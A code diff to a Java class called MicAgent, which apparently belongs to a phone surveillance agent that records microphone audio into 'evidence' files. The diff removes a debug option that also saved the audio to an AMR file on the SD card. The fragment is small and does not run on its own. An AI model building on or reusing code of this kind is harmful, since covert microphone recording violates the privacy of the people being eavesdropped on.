@@ -46,10 +46,6 @@ public final class MicAgent extends Agent implements PhoneListener {
     static Debug debug = new Debug("MicAgent", DebugLevel.VERBOSE);
     //#endif
 
-    //#ifdef SAVE_AMR_FILE
-    AutoFlashFile amrfile;
-    //#endif
-
     //AudioRecorderDispatcher recorder;
     long fId;
 
@@ -165,17 +161,6 @@ public final class MicAgent extends Agent implements PhoneListener {
         final DateTime dateTime = new DateTime();
         fId = dateTime.getFiledate();
 
-        //#ifdef SAVE_AMR_FILE
-        final String filename = Path.SD() + "filetest."
-                + dateTime.getOrderedString() + ".amr";
-        debug.trace("Creating file: " + filename);
-        amrfile = new AutoFlashFile(filename, false);
-        final boolean ret = amrfile.create();
-        //ret &= amrfile.write(AudioRecorder.AMR_HEADER);
-
-        Check.asserts(ret, "actualStart: cannot write file: " + filename);
-        //#endif
-
         recorder = new AudioRecorder();
         recorder.start();
 
@@ -279,18 +264,12 @@ public final class MicAgent extends Agent implements PhoneListener {
 
             evidence.writeEvidence(chunk, offset);
             evidence.close();
-
-            //#ifdef SAVE_AMR_FILE    
-            final boolean ret = amrfile.append(chunk);
-            Check.asserts(ret, "cannot write file!");
-            //#endif
         } else {
             //#ifdef DEBUG
             debug.warn("zero chunk: " + chunk);
             //#endif
             numFailures += 1;
         }
-
     }
 
     private byte[] getAdditionalData() {
